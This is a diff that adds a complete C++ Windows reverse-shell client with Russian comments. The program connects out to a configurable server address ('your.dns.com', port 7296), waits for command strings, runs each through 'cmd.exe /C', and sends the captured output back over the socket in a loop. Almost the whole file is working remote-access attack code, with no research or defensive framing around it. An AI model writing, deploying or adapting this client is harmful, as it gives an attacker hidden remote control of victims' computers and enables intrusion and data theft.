@@ -1,0 +1,133 @@
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string>
+#include <windows.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+#define SERVER_DNS "your.dns.com" // DNS-адрес
+#define SERVER_PORT 7296              // Порт сервера, ёпты
+#define BUFFER_SIZE 1024
+
+std::wstring stringToWstring(const std::string& str) {
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
+    if (size_needed <= 0) return L"";
+    std::wstring wstr(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size_needed);
+    wstr.pop_back();
+    return wstr;
+}
+
+std::string executeCommand(const std::string& command) {
+    HANDLE hStdOutRead = nullptr, hStdOutWrite = nullptr;
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.lpSecurityDescriptor = nullptr;
+    sa.bInheritHandle = TRUE;
+
+    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
+        return "Error creating pipe";
+    }
+
+    STARTUPINFO si = {};
+    si.cb = sizeof(STARTUPINFO);
+    si.hStdOutput = hStdOutWrite;
+    si.hStdError = hStdOutWrite;
+    si.dwFlags |= STARTF_USESTDHANDLES;
+
+    PROCESS_INFORMATION pi = {};
+    std::wstring fullCommand = stringToWstring("cmd.exe /C " + command);
+
+    if (!CreateProcess(
+        nullptr,
+        &fullCommand[0],
+        nullptr, nullptr,
+        TRUE, 0,
+        nullptr, nullptr,
+        &si, &pi)) {
+        CloseHandle(hStdOutRead);
+        CloseHandle(hStdOutWrite);
+        return "Error creating process";
+    }
+
+    CloseHandle(hStdOutWrite);
+
+    std::string result;
+    char buffer[BUFFER_SIZE];
+    DWORD bytesRead;
+    while (ReadFile(hStdOutRead, buffer, BUFFER_SIZE - 1, &bytesRead, nullptr) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        result += buffer;
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hStdOutRead);
+
+    return result.empty() ? "Command executed with no output" : result;
+}
+
+int main() {
+    WSADATA wsaData;
+    SOCKET clientSocket;
+    struct addrinfo hints = {}, * result = nullptr;
+    char buffer[BUFFER_SIZE] = { 0 };
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "WSAStartup failed\n";
+        return 1;
+    }
+
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+
+    if (getaddrinfo(SERVER_DNS, std::to_string(SERVER_PORT).c_str(), &hints, &result) != 0) {
+        std::cerr << "Failed to resolve DNS\n";
+        WSACleanup();
+        return 1;
+    }
+
+    clientSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+    if (clientSocket == INVALID_SOCKET) {
+        std::cerr << "Socket creation failed\n";
+        freeaddrinfo(result);
+        WSACleanup();
+        return 1;
+    }
+
+    if (connect(clientSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
+        std::cerr << "Failed to connect to server\n";
+        closesocket(clientSocket);
+        freeaddrinfo(result);
+        WSACleanup();
+        return 1;
+    }
+    freeaddrinfo(result);
+    std::cout << "Connected to server\n";
+
+    while (true) {
+        int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);
+        if (bytesReceived <= 0) {
+            std::cerr << "Server disconnected or error occurred\n";
+            break;
+        }
+
+        buffer[bytesReceived] = '\0';
+        std::string command(buffer);
+    
+        std::cout << "Received command: " << command << "\n";
+        std::string result = executeCommand(command);
+
+        if (send(clientSocket, result.c_str(), result.size(), 0) == SOCKET_ERROR) {
+            std::cerr << "Failed to send result to server\n";
+            break;
+        }
+    }
+
+    closesocket(clientSocket);
+    WSACleanup();
+    return 0;
+}
